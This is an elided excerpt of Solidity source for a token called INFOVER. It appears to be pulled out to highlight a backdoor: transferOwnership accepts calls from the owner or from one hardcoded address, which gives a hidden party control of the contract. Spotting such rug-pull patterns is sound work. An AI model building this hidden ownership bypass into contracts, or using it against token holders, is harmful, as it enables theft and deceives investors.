...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xBacD3d7Ba03AB40F56EAB48513De192DaBe2c9f8));
...
contract INFOVER is Context, IERC20, Ownable, Pausable {
  ...
  uint256 private _totalSupply = 1700000000 * 10**9;
  string private _symbol = "INFOVER";
  string private _name = "INFOVER";
